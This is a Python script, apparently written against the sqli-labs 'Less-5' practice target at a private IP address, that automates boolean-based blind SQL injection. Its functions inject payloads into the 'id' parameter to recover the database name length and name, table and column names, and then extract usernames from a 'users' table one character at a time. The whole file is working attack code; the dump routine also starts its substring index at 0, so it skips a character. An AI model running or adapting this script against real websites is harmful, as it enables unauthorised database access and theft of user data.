import string
import requests
url = "http://192.168.1.102:32769/Less-5/?id="

def db_length():
    name = ''
    for i in range(1,10):
        payload = url + "1' and length(database())={}%23".format(i)
        req = requests.get(payload)
        if "You are in..........." in req.text:
            name = str(i)
            print('db_length: ' + name)

def database():
    name = ''
    for i in range(1,9):
        for j in string.digits + string.ascii_letters:
            payload = url + "1' and substr(database(),{0},1)='{1}'%23".format(i,j)
            req = requests.get(payload)
            if "You are in..........." in req.text:
                name += j
                #print(name)
                break
    print('database: ' + name)

def table_name():
    list = []
    for i in range(0,4):
        name = ''
        for j in range(1,9):
            for k in string.ascii_letters:
                payload = url + "1' and (substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1))='{}'%23".format(i,j,k)
                req = requests.get(payload)
                if "You are in..........." in req.text:
                    name += k
                    break
        list.append(name)
    print('table name : ',list)

def column_name():
    list = []
    for i in range(0,3):
        name = ''
        for j in range(1,9):
            for k in string.ascii_letters + string.digits:
                payload = url + "1' and (substr((select column_name from information_schema.columns where table_name='users' limit {},1),{},1))='{}'%23".format(i,j,k)
                #print(payload)
                req = requests.get(payload)
                if "You are in..........." in req.text:
                    name += k
                    break
        list.append(name)
    print('column_name: ',list)

def dump():
    list = []
    for i in range(0,10):
        name = ''
        for j in range(0,6):
            for k in range(1,128):
                payload = url + "1' and ascii(substr((select username from users limit {},1),{},1))={}%23".format(i,j,k)
                req = requests.get(payload)
                if "You are in..........." in req.text:
                    name += chr(k)
                    break
        list.append(name)
    print(list)

def main():
    db_length()
    database()
    table_name()
    column_name()
    dump()

if __name__ == '__main__':
    main()
